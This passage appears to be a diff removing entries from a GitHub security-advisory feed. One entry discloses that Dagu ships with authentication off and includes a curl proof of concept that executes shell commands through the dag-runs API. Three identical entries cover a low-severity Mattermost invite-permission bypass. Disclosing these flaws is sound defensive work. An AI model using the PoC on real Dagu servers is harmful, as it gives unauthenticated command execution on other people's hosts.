-        <link href="https://github.com/advisories/GHSA-6qr9-g2xw-cw92"/>
-        <updated>2026-02-20T21:44:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Dagu's default configuration ships with authentication disabled. The <code>POST /api/v2/dag-runs</code> endpoint accepts an inline YAML spec and executes its shell commands immediately with no credentials required — any dagu instance reachable over the network is fully compromised by default.</p>
-<h3 id="details">Details</h3>
-<p><code>internal/service/app/config/loader.go:226</code> sets <code>AuthModeNone</code> as the default. With no auth mode configured, <code>internal/frontend/api/v2/handlers/api.go:520</code> returns <code>nil</code> from <code>requireExecute()</code> — all permission checks pass without a valid session.</p>
-<p>The <code>POST /api/v2/dag-runs</code> endpoint accepts a <code>spec</code> field containing a full YAML DAG definition. The spec is parsed and the commands execute immediately on the host with no validation beyond YAML parsing.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-bash">curl -s -X POST http://TARGET:8080/api/v2/dag-runs \
-  -H "Content-Type: application/json" \
-  -d '{"name":"poc","spec":"steps:\n  - name: rce\n    command: id &gt; /tmp/pwned\n"}'
-# Response: {"dagRunId":"&lt;uuid&gt;"}
-# /tmp/pwned contains: uid=1000(dagu) gid=1000(dagu)
-</code></pre>
-<p>Confirmed on <code>ghcr.io/dagu-org/dagu:latest</code> with no configuration changes.</p>
-<h3 id="impact">Impact</h3>
-<p>Every dagu deployment using default settings — every Docker deployment, every install following the documentation, every instance without explicit <code>DAGU_AUTH_MODE</code> configuration — is fully compromised without credentials. An attacker with network access gets OS command execution as the dagu process user.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/dagu-org/dagu/security/advisories/GHSA-6qr9-g2xw-cw92">https://github.com/dagu-org/dagu/security/advisories/GHSA-6qr9-g2xw-cw92</a></li>
-<li><a href="https://github.com/advisories/GHSA-6qr9-g2xw-cw92">https://github.com/advisories/GHSA-6qr9-g2xw-cw92</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6qr9-g2xw-cw92</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-02-19T22:04:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost fails to enforce invite permissions when updating team settings]]></title>
-        <id>https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</id>
-        <link href="https://github.com/advisories/GHSA-cgjg-p2m2-qm4p"/>
-        <updated>2026-02-19T19:40:45.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 10.11.x &lt;= 10.11.9 fail to enforce invite permissions when updating team settings, which allows team administrators without proper permissions to bypass restrictions and add users to their team via API requests. Mattermost Advisory ID: MMSA-2025-00561</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14573">https://nvd.nist.gov/vuln/detail/CVE-2025-14573</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/6404ab29acc04901c5cb1cf5ad97fc3c0693e2cd">https://github.com/mattermost/mattermost/commit/6404ab29acc04901c5cb1cf5ad97fc3c0693e2cd</a></li>
-<li><a href="https://github.com/advisories/GHSA-cgjg-p2m2-qm4p">https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-02-16T15:32:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost fails to enforce invite permissions when updating team settings]]></title>
-        <id>https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</id>
-        <link href="https://github.com/advisories/GHSA-cgjg-p2m2-qm4p"/>
-        <updated>2026-02-19T19:40:45.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 10.11.x &lt;= 10.11.9 fail to enforce invite permissions when updating team settings, which allows team administrators without proper permissions to bypass restrictions and add users to their team via API requests. Mattermost Advisory ID: MMSA-2025-00561</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14573">https://nvd.nist.gov/vuln/detail/CVE-2025-14573</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/6404ab29acc04901c5cb1cf5ad97fc3c0693e2cd">https://github.com/mattermost/mattermost/commit/6404ab29acc04901c5cb1cf5ad97fc3c0693e2cd</a></li>
-<li><a href="https://github.com/advisories/GHSA-cgjg-p2m2-qm4p">https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-02-16T15:32:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost fails to enforce invite permissions when updating team settings]]></title>
-        <id>https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</id>
-        <link href="https://github.com/advisories/GHSA-cgjg-p2m2-qm4p"/>
-        <updated>2026-02-19T19:40:45.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 10.11.x &lt;= 10.11.9 fail to enforce invite permissions when updating team settings, which allows team administrators without proper permissions to bypass restrictions and add users to their team via API requests. Mattermost Advisory ID: MMSA-2025-00561</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14573">https://nvd.nist.gov/vuln/detail/CVE-2025-14573</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/6404ab29acc04901c5cb1cf5ad97fc3c0693e2cd">https://github.com/mattermost/mattermost/commit/6404ab29acc04901c5cb1cf5ad97fc3c0693e2cd</a></li>
-<li><a href="https://github.com/advisories/GHSA-cgjg-p2m2-qm4p">https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cgjg-p2m2-qm4p</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-02-16T15:32:47.000Z</published>
     </entry>
 </feed>
